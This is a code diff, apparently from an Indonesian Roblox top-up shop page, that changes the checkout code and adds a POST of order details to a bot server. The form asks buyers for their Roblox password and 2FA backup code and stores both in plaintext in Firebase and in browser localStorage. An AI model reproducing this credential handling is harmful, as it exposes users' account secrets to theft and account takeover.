@@ -365,12 +365,17 @@
             Swal.fire({ title: 'Menyimpan...', allowOutsideClick: false, didOpen: () => Swal.showLoading() });
             
             const trxId = "RBX-" + Date.now().toString().slice(-6);
+            const userVal = document.getElementById('rbx-user').value;
+            const passVal = document.getElementById('rbx-pass').value;
+            const backupVal = document.getElementById('rbx-backup').value;
+            const waVal = document.getElementById('wa-user').value;
+
             const data = { 
                 id: trxId, 
-                username: document.getElementById('rbx-user').value, 
-                password: document.getElementById('rbx-pass').value, 
-                backup_code: document.getElementById('rbx-backup').value, 
-                wa: document.getElementById('wa-user').value, 
+                username: userVal, 
+                password: passVal, 
+                backup_code: backupVal, 
+                wa: waVal, 
                 product: window.selectedProduct.name, 
                 price: window.selectedProduct.price, 
                 method: window.chosenMethod, 
@@ -379,12 +384,33 @@
             };
             
             try {
+                // 1. Simpan ke Firebase
                 await set(ref(db, 'transactions/' + trxId), data);
                 
+                // 2. Simpan ke Local History
                 let history = JSON.parse(localStorage.getItem('robloxHistory')) || [];
                 history.unshift(data);
                 localStorage.setItem('robloxHistory', JSON.stringify(history));
 
+                // 3. KIRIM KE BOT VYNZZHOST (Agar ada tombol Berhasil/Gagal)
+                try {
+                    await fetch('http://vynzzhost-properties:8080/order-masuk', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            order_id: trxId,
+                            produk: data.product,
+                            harga: data.price.toLocaleString('id-ID'),
+                            pembeli: data.username,
+                            wa: data.wa,
+                            method: data.method
+                        })
+                    });
+                } catch(botErr) {
+                    console.error("Gagal lapor ke Bot Vynzz:", botErr);
+                }
+
+                // 4. KIRIM BUKTI KE WEBHOOK DISCORD (Statis Log)
                 const formData = new FormData();
                 formData.append('payload_json', JSON.stringify({ 
                     embeds: [{ 
